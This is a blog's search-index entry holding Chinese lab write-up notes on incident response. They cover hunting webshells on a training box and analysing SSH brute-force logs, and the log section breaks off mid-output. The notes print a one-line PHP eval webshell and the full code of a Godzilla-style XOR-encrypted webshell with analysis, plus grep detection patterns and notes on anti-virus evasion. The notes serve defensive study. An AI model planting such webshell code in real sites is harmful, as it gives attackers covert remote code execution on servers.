<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>玄机靶场第一章学习笔记</title>
      <link href="/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-应急响应-webshell查杀"><a href="#第一章-应急响应-webshell查杀" class="headerlink" title="第一章 应急响应-webshell查杀"></a>第一章 应急响应-webshell查杀</h1><blockquote><p>简介</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;靶机账号密码 root xjwebshell</span><br><span class="line">&gt;1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;</span><br><span class="line">&gt;2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;</span><br><span class="line">&gt;3.黑客隐藏shell的完整路径的md5 flag&#123;md5&#125; 注 : /xxx/xxx/xxx/xxx/xxx.xxx</span><br><span class="line">&gt;4.黑客免杀马完整路径 md5 flag&#123;md5&#125;</span><br></pre></td></tr></table></figure></div></blockquote><h2 id="步骤1"><a href="#步骤1" class="headerlink" title="步骤1"></a>步骤1</h2><blockquote><p>黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</p></blockquote><p>基础知识：<strong>代码特征</strong></p><blockquote><ol><li>可疑函数调用</li></ol><p>WebShell通常会使用一些危险的函数来执行系统命令或代码，如：</p><pre><code>PHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()ASP: Execute(), Eval(), CreateObject()JSP: Runtime.getRuntime().exec()</code></pre><ol start="2"><li>编码和解码</li></ol><p>WebShell经常使用编码和解码技术来隐藏其真实意图，如Base64编码：</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;encoded_string&#x27;</span>));</span><br></pre></td></tr></table></figure></div><ol start="3"><li><strong>文件操作</strong></li></ol><p>WebShell可能会包含文件操作函数，用于读取、写入或修改文件：     </p><ul><li>PHP: <code>fopen()</code>, <code>fwrite()</code>, <code>file_get_contents()</code>, <code>file_put_contents()</code></li><li>ASP: <code>FileSystemObject</code></li></ul><ol start="4"><li>网络操作</li></ol><p>WebShell可能会包含网络操作函数，用于与远程服务器通信：     </p><ul><li>PHP: <code>fsockopen()</code>, <code>curl_exec()</code>, <code>file_get_contents(&#39;http://...&#39;)</code></li><li>ASP: <code>WinHttp.WinHttpRequest</code></li></ul><p>上面刚刚也说了我们可以尝试定位一些特殊的后缀文件，例如：.asp、.php、.jsp、.aspx。</p><p>命令：</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征</span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.jsp&quot;</span> | xargs grep <span class="string">&quot;exec(&quot;</span> </span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> | xargs grep <span class="string">&quot;eval(&quot;</span> </span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.asp&quot;</span> | xargs grep <span class="string">&quot;execute(&quot;</span> </span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.aspx&quot;</span> | xargs grep <span class="string">&quot;eval(&quot;</span> </span><br><span class="line"> </span><br><span class="line">//对于免杀Webshell，可以查看是否使用编码</span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> | xargs grep <span class="string">&quot;base64_decode&quot;</span> </span><br></pre></td></tr></table></figure></div></blockquote><p>先使用Xshell连接</p><p>再使用命令<code>find ./ type f -name &quot;*.php&quot; | xargs grep &quot;eval(&quot;</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find ./ -type f -name &quot;*.php&quot;</span><br><span class="line"></span><br><span class="line">find ./ type f -name &quot;*.php&quot; | xargs grep &quot;eval&quot;</span><br><span class="line"></span><br><span class="line">find ./ -type f -name &quot;*.php&quot; -exec grep &quot;eval&quot; &#123;&#125; +</span><br></pre></td></tr></table></figure></div><blockquote><p>xargs：xargs命令用于将输入数据重新格式化后作为参数传递给其他命令。在这个命令中，xargs将find命令找到的文件列表作为参数传递给grep命令。</p><p>grep “eval(“：grep命令用于搜索文本，并输出匹配的行。这里”eval(“是grep命令的搜索模式，用于查找包含eval(字符串的行。</p></blockquote><p>找到一个<code>&lt;?php phpinfo();@eval($_REQUEST[1]);?&gt;</code></p><p><img src="https://pic1.zhimg.com/80/v2-d8f1aa1e03a3b2b3939160eb0f9b6d85_1440w.png?source=d16d100b"></p><p>很明显shell.php是一个病毒文件，定位一下它的目录过发现没什么，找找其他的php文件</p><p>最后终于在gz.php里面发现了；</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//027ccd04-5065-48b6-a32d-77c704a5e26d</span></span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>这段 PHP 代码主要涉及处理 HTTP 请求中的数据，并通过对数据进行编码、解码与会话存储实现动态执行某些操作。具体来说，代码看似用于某种类型的远程代码执行机制，其中使用了 <code>eval()</code> 函数来执行动态生成的代码。下面对代码逐行进行分析。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><h4 id="1-启动会话与禁用错误报告"><a href="#1-启动会话与禁用错误报告" class="headerlink" title="1. 启动会话与禁用错误报告"></a>1. 启动会话与禁用错误报告</h4><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></div><ul><li><code>@session_start();</code>：启动会话处理，<code>@</code> 符号用于抑制可能的错误（如会话已经启动的警告）。</li><li><code>@set_time_limit(0);</code>：设置脚本的最大执行时间为 0，意味着脚本可以无限制地运行。</li><li><code>@error_reporting(0);</code>：关闭所有错误报告，这样运行时的错误信息不会被显示出来，通常用于隐藏潜在的错误信息，避免被外部用户发现漏洞。</li></ul><h4 id="2-encode-函数定义"><a href="#2-encode-函数定义" class="headerlink" title="2. encode 函数定义"></a>2. <code>encode</code> 函数定义</h4><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><p><code>encode</code> 函数实现了一个简单的 XOR 加密算法。它使用一个密钥 <code>$K</code> 对数据 <code>$D</code> 中的每个字符进行 XOR 操作。</p></li><li><p><code>for($i=0;$i&lt;strlen($D);$i++) &#123; $c = $K[$i+1&amp;15]; &#125;</code>：对于每个字符，密钥 <code>$K</code> 被循环使用（每次通过 <code>&amp;15</code> 限制为 16 字符的循环）。</p></li><li><p><code>^</code> 是 XOR 操作符，用来将每个字符与密钥进行 XOR 加密&#x2F;解密。</p><p>这个函数可以用来进行数据加密和解密，因为 XOR 操作具有对称性：即 <code>A^B^B = A</code>。</p></li></ul><h4 id="3-数据获取与处理"><a href="#3-数据获取与处理" class="headerlink" title="3. 数据获取与处理"></a>3. 数据获取与处理</h4><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br></pre></td></tr></table></figure></div><ul><li><code>$payloadName</code> 设置为 <code>payload</code>，这是一个用来存储加密数据的会话变量名。</li><li><code>$key</code> 是用来加密和解密的密钥。</li><li><code>$data</code> 获取来自 HTTP 请求的原始输入数据（<code>php://input</code>），这个数据通常是 POST 请求的内容。</li></ul><h4 id="4-数据加密与会话检查"><a href="#4-数据加密与会话检查" class="headerlink" title="4. 数据加密与会话检查"></a>4. 数据加密与会话检查</h4><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ol><li><strong>数据处理</strong>：<ul><li>如果 <code>$data</code> 不是 <code>false</code>，说明读取到请求体中的数据，接着对其进行加密（<code>$data = encode($data, $key)</code>）。</li></ul></li><li><strong>会话存在检查</strong>：<ul><li>如果会话中有 <code>payload</code>（即 <code>$_SESSION[$payloadName]</code> 存在），则对会话中的 <code>payload</code> 进行解密。</li><li>然后判断 <code>payload</code> 中是否包含 <code>getBasicsInfo</code> 字符串。如果没有，就对 <code>payload</code> 再次进行加密。这看起来像是某种数据完整性校验，确保 <code>payload</code> 中没有受到篡改。</li></ul></li><li><strong><code>eval()</code> 执行动态代码</strong>：<ul><li><code>eval($payload);</code>：这个函数会执行 <code>$payload</code> 变量中的 PHP 代码。这里是潜在的安全漏洞，因为如果 <code>payload</code> 经过篡改或不受信任的输入，它可能会导致任意代码执行。</li></ul></li><li><strong>执行数据与返回</strong>：<ul><li><code>echo encode(@run($data),$key);</code>：执行加密后的 <code>$data</code>（通过 <code>@run($data)</code>），然后将结果加密后返回。</li><li><code>@run()</code> 可能是一个自定义函数，但由于代码中没有提供该函数的定义，不能完全确定它的实现。</li></ul></li><li><strong>会话存储</strong>：<ul><li>如果会话中没有 <code>payload</code>，且 <code>$data</code> 中包含 <code>getBasicsInfo</code> 字符串，则将 <code>$data</code> 加密并存储在会话中，作为后续请求的基础数据。</li></ul></li></ol><h4 id="5-潜在的安全问题"><a href="#5-潜在的安全问题" class="headerlink" title="5. 潜在的安全问题"></a>5. 潜在的安全问题</h4><ul><li><strong><code>eval()</code> 的使用</strong>：<code>eval()</code> 用于执行动态生成的 PHP 代码，如果 <code>payload</code> 数据不安全或来自不信任的用户输入，就可能导致远程代码执行漏洞（RCE）。这可以让攻击者在服务器上执行任意 PHP 代码，极为危险。</li><li><strong>数据加密与解密</strong>：虽然数据经过加密，但使用相同的密钥进行加解密，这可能并不足够防止攻击。加密的实现方式相对简单，也容易被攻击者通过某些手段恢复密钥。</li><li><strong>错误隐蔽</strong>：通过 <code>@error_reporting(0)</code> 关闭错误报告，这意味着如果出现错误，攻击者很难发现漏洞的存在。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>该 PHP 脚本看起来是设计用来处理通过 HTTP 请求传入的加密数据，并使用 <code>eval()</code> 执行传入的 PHP 代码。虽然加密数据可能看起来增加了安全性，但其对 <code>eval()</code> 函数的使用，以及错误报告的抑制，使得它很容易成为远程代码执行的攻击目标。使用 <code>eval()</code> 执行动态代码是一个严重的安全隐患，建议避免这种做法。</p></blockquote><p>flag:<code>flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</code></p><h2 id="步骤2"><a href="#步骤2" class="headerlink" title="步骤2"></a>步骤2</h2><blockquote><p>黑客使用的什么工具的shell github地址的md5 flag{md5}</p></blockquote><p>遇到这种类型的题目，我们就是要分析一下是什么类型的webshell，其实开头三句就可以分析出是godzilla的webshell了；</p><p>为什么这样说？</p><p>哥斯拉病毒是一种Java后门木马，通常用于攻击并控制<a href="https://so.csdn.net/so/search?q=Web%E6%9C%8D%E5%8A%A1%E5%99%A8&spm=1001.2101.3001.7020">Web服务器</a>。特征就包括：</p><blockquote><ol><li><strong>@session_start();</strong> - 开启一个会话。</li><li><strong>@set_time_limit(0);</strong> - 设置脚本执行时间为无限。</li><li><strong>@error_reporting(0);</strong> - 关闭所有错误报告。</li></ol></blockquote><p>这些代码行主要用于隐藏病毒活动并确保其能够长时间运行而不被发现。哥斯拉病毒通常会通过Webshell或其他漏洞注入到服务器中，然后使用这些命令来掩盖其存在并执行进一步的恶意操作。</p><p>所以我们只需要找到它的github地址并且进行MD5加密即可；</p><blockquote><p>Godzilla地址：<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p></blockquote><p>md5加密一下</p><p>flag:<code>flag&#123;39392DE3218C333F794BEFEF07AC9257&#125;</code></p><h2 id="步骤3"><a href="#步骤3" class="headerlink" title="步骤3"></a>步骤3</h2><blockquote><p>黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</p></blockquote><p><img src="https://picx.zhimg.com/80/v2-f22b3eb28c713e7d9507ac12aedccb94_1440w.png?source=d16d100b"></p><p>那既然说黑客隐藏shell了，那我们肯定需要用到命令<code>ls -la</code>进行查找；上面那个就很像</p><p>然后发现在挨个查找的过程中发现<code>.Mysqlli.php</code>如果普通的ls查看目录是查不出来的，必须用到<code>ls -la</code>才行，所以它就是隐藏了，我们直接定位一些它的路径，进行MD5加密即可；</p><blockquote><p>路径：&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db&#x2F;.Mysqli.php</p></blockquote><p>flag:<code>flag&#123;AEBAC0E58CD6C5FAD1695EE4D1AC1919&#125;</code></p><h2 id="步骤4"><a href="#步骤4" class="headerlink" title="步骤4"></a>步骤4</h2><blockquote><p>黑客免杀马完整路径 md5 flag{md5}</p></blockquote><p>免杀马（免杀病毒或免杀Webshell）是指经过特殊处理和混淆，使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序。黑客使用各种技术手段，使恶意代码看起来像是正常代码，从而躲避签名检测和基于规则的安全机制。这种技术通常用于Webshell和其他后门程序，目的是保持对受害系统的隐蔽访问。</p><blockquote><p>&#x3D;&#x3D;常见的免杀技术&#x3D;&#x3D;:</p><p>代码混淆：</p><p>   使用混淆工具或手动混淆代码，使其难以被直接阅读和分析。</p><p>编码和加密：</p><p>   使用Base64、ROT13等编码方式或更复杂的加密技术隐藏恶意代码片段。</p><p>动态生成和执行：</p><p>   通过动态生成代码并在运行时执行，绕过静态分析。例如，使用 eval()、create_function() 等PHP函数。</p><p>多层解码：</p><p>   多层编码或加密，增加分析和检测的难度。</p><p>使用合法函数：</p><p>   恶意代码嵌入到看似合法的代码中，利用正常的函数调用执行恶意操作。<br>&#x3D;&#x3D;查找和处理免杀马的方法&#x3D;&#x3D;</p><p>文件完整性检查：</p><p>   比较当前文件与已知的良性备份文件，发现被修改或新增的文件。</p><p>代码审查：</p><p>   手动检查可疑文件，寻找混淆、编码、加密和动态执行的代码模式。</p><p>安全扫描工具：</p><p>   使用高级安全扫描工具，这些工具使用行为分析和机器学习来检测潜在的免杀马。</p><p>日志分析：</p><p>   查看服务器访问日志和错误日志，寻找异常访问和执行模式。<br>   检查文件修改时间，与正常更新周期不符的文件可能是可疑的。</p><p>基于特征的检测：</p><p>   使用YARA规则等特征检测工具，根据已知的免杀马特征进行扫描。</p><blockquote><p>总结：免杀马通过静态检测是检测不到的，因为在免杀的过程中将webshel的特征值以及特征函数都给去掉了，因为webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录，这里也顺便说一下linux的日志存放在&#x2F;var&#x2F;log目录下。</p></blockquote></blockquote><p>既然它经过了免杀处理，那么木马的特征值以及特征函数应该都是被去掉了。这时我们再通过静态检测是基本检测不到的，从上面我们就可以看出我们只找到了三个马。而且上面我们说了webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录。</p><p>我们到apache2目录下面查看一下access.log日志，查看分析一下；（因为是日志所以记录有点多）</p><p>大部分都是重复的只有少数不一样的；</p><p>我们可以看到有个名为top.php的文件执行了<code>phpinfo()</code>；且返回值为&#x3D;&#x3D;200&#x3D;&#x3D;，有点可疑。去找到相对应的文件发现是一个正常的文件</p><p>继续往下翻，又发现一个较为可疑的文件，到此目录下面查看该文件。</p><p>目录：<code>/wap/top.php</code></p><p><img src="https://pic1.zhimg.com/80/v2-a21b1e081f42ab40cb58c21384352eae_1440w.jpg?source=d16d100b"></p><p>可以看到这段代码是具有前面做免杀的特征，这里采用了异或，编码混淆，还有动态调用的方法。后面的func2是能够结合生成assert进行动态调用的代码执行的。</p><p>可以判断是个恶意文件，最后把路径进行md5进行加密即可；</p><blockquote><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;wap&#x2F;top.php</p></blockquote><p>flag:<code>flag&#123;eeff2eabfd9b7a6d26fc1a53d3f7d1de&#125;</code></p><h1 id="第一章-应急响应-Linux日志分析"><a href="#第一章-应急响应-Linux日志分析" class="headerlink" title="第一章 应急响应-Linux日志分析"></a>第一章 应急响应-Linux日志分析</h1><blockquote><p>简介</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">账号root密码linuxrz</span><br><span class="line">ssh root@IP</span><br><span class="line">1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割</span><br><span class="line">2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割</span><br><span class="line">3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割</span><br><span class="line">4.登陆成功的IP共爆破了多少次</span><br><span class="line">5.黑客登陆主机后新建了一个后门用户，用户名是多少</span><br></pre></td></tr></table></figure></div></blockquote><h2 id="步骤1-1"><a href="#步骤1-1" class="headerlink" title="步骤1"></a>步骤1</h2><blockquote><p>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割 小到大排序 例如flag{192.168.200.1,192.168.200.2}</p></blockquote><p>在Linux系统中，SSH登录尝试的日志通常记录在<code>/var/log/auth.log</code>或者<code>/var/log/secure</code>文件中</p><p><img src="https://pic1.zhimg.com/80/v2-725210ba38a3cee6bbab2df9268e62f1_1440w.png"></p><blockquote><p><code>auth.log</code> 和 <code>auth.log.1</code> 的区别在于：</p><ul><li><strong><code>auth.log</code></strong> 是当前正在记录的认证相关日志文件，系统的身份验证信息（如登录、sudo、ssh连接等）实时写入这个文件。</li><li><strong><code>auth.log.1</code></strong> 是前一个周期的认证日志的归档文件，是系统在日志轮转（log rotation）后生成的备份。</li></ul><h3 id="日志轮转机制（logrotate）简介："><a href="#日志轮转机制（logrotate）简介：" class="headerlink" title="日志轮转机制（logrotate）简介："></a>日志轮转机制（logrotate）简介：</h3><p>系统为了避免单个日志文件无限增大，会定期（比如每天、每周等）把旧日志重命名为 <code>.1</code>、<code>.2.gz</code> 等归档版本，并创建一个新的空日志文件继续记录。</p><p>例如：</p><ul><li><code>auth.log</code>：今天或这次轮转之后的日志。</li><li><code>auth.log.1</code>：上一个周期的日志内容。</li><li>如果有 <code>auth.log.2.gz</code>，那就是更久之前的，通常已经压缩归档。</li></ul><hr><h3 id="怎么用它们？"><a href="#怎么用它们？" class="headerlink" title="怎么用它们？"></a>怎么用它们？</h3><ul><li>查看当前登录、权限相关行为：<code>cat /var/log/auth.log</code></li><li>查看历史认证行为（比如昨天或前几天的）：<code>cat /var/log/auth.log.1</code> 或 <code>zcat /var/log/auth.log.2.gz</code></li></ul><p>如果你想调试 ssh 登录、sudo 行为、安全问题，<code>auth.log</code> 系列是重点。</p></blockquote><p>所以我们看<code>auth.log.1</code></p><p><img src="https://pic1.zhimg.com/80/v2-627ac4bf8381f5c9811d4ceae6ca059b_1440w.png"></p><p>首先要记得我们需要的是爆破主机ssh的root账号。</p><p>我们这里可以用命令筛选一下。</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log# <span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;Failed password for root&quot;</span></span><br><span class="line">Aug  1 07:42:32 linux-rz sshd[7471]: Failed password <span class="keyword">for</span> root from 192.168.200.32 port 51888 ssh2</span><br><span class="line">Aug  1 07:47:13 linux-rz sshd[7497]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 34703 ssh2</span><br><span class="line">Aug  1 07:47:18 linux-rz sshd[7499]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 46671 ssh2</span><br><span class="line">Aug  1 07:47:20 linux-rz sshd[7501]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 39967 ssh2</span><br><span class="line">Aug  1 07:47:22 linux-rz sshd[7503]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 46647 ssh2</span><br><span class="line">Aug  1 07:52:59 linux-rz sshd[7606]: Failed password <span class="keyword">for</span> root from 192.168.200.31 port 40364 ssh2</span><br></pre></td></tr></table></figure></div><p>这里参考一下Peterpan师傅的命令：</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log# <span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;Failed password for root&quot;</span> | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 